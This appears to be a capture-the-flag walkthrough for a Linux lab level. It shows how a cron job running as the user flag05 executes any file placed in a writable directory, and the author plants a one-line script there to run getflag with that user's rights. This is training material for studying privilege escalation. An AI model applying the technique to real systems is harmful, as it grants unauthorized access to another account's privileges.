As we connect, we got a mail.

Mail are stored at /var/mail/$USER and /var/spool/mail/$USER

<- cat /var/spool/mail/$USER
-> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

We got a crontab that execute every 2 minutes as flag05 the script in /usr/sbin/openarenaserver.
Let's check that file:

<- cat /usr/sbin/openarenaserver
-> #!/bin/sh
-> 
-> for i in /opt/openarenaserver/* ; do
->         (ulimit -t 5; bash -x "$i")
->         rm -f "$i"
-> done

This script execute each executable files in /opt/openarenaserver/ whom won't exceed 5 secound and delete it after that.

So we'll just write a file that call getflag:

<- echo 'getflag > /tmp/popipo' > /opt/openarenaserver/popipo

And that all. Now we wait more or less 2 minutes.

...
One eternity later
...

<- cat /tmp/popipo
